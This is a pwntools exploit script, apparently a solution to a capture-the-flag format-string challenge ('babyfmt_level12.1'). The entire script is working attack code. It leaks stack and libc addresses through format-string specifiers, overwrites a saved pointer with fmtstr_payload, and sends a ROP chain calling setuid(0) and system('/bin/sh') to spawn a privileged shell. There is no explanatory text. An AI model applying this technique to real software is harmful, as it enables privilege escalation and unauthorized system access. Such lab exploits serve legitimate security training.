from pwn import *
context.binary = "/challenge/babyfmt_level12.1"
context.terminal = ['tmux','splitw','-h']
#p = gdb.debug("/challenge/babyfmt_level12.1")
p = process()
payload1 = '%p'*6 + '|%p|' + '%p'*4 + '.>%p'
print(payload1)
p.sendline(bytes(payload1,'utf-8'))
p.recvuntil(b'Your input is:')
p.recvline()
p.recvuntil(b'|')
leak_stack = int(p.recvuntil(b'|').strip(b'|').decode(),base=16) + 0x3b5
p.recvuntil(b'.>')
leak_libc = int(p.recvline().strip(b'\n').decode(),base=16) - 0x20a4f8
log.info("Leak libc: %s", hex(leak_libc))
log.info("Leak stack (rbp): %s", hex(leak_stack))
#add_rsp = leak_libc + 0xf9fcd #0x20ef1
pop_rdi = leak_libc + 0x1b6a
setuid = leak_libc + 0xc2150
bin_sh = leak_libc + 0x1925bd
system_func = leak_libc + 0x30290
pop_rbp = leak_libc + 0x6c0
overwrite = leak_stack -704 #0x100 -0x3b5 #0x1b8-0x8 #+ 0x1a0-0x8
leave_ret = leak_libc+ 0x358c8
ret = leak_libc + 0x358c9
log.info("Overwrite: %s", hex(overwrite))
#p.recv()
time.sleep(0.3)
payload2 = b'A'*5+fmtstr_payload(28,{leak_stack:overwrite},112,no_dollars=True) 
payload2+= cyclic(253-len(payload2)) #+ b'B' * 16 + b'C'* 16
payload2 += p64(pop_rdi) + p64(0) + p64(setuid) + p64(pop_rdi) + p64(bin_sh) + p64(system_func) #+ p64(0)
#payload2 += cyclic(616-40) + p64(pop_rbp) + p64(overwrite) + p64(leave_ret)
#+ b'B'*16 + b'C'*16
p.sendline(payload2)
p.interactive()









